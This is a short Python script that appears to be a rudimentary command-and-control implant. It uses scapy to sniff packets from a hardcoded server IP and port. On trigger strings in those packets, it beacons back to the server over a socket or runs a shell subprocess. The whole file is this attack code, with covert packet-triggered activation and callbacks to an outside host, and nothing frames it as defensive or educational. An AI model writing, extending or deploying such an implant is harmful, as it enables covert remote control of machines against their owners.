from scapy.all import *
import random
import sys
import socket
import subprocess


#command server ip
serverIP = "207.246.82.100"
serverPort = 8000

def respondToServer(pkt):
	if pkt.haslayer(Raw):
		print(str(pkt.load))
		#respond if a packet from the server includes this string set up a socket
		if "?command=stat" in str(pkt.load):
			#print(str(pkt.load))
			request = ('GET /test HTTP/1.1\nHost: ' + serverIP + '\n\n').encode()
			print("command received")
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((serverIP, serverPort))
			s.send(request)
			result = s.recv(256)
			if (len(result) > 0):
				print(result)
		elif "?command=echo" in str(pkt.load):
			subprocess.call(["echo", "testtesttest"], shell=True)
			


sniff(filter="host " + serverIP, prn=respondToServer)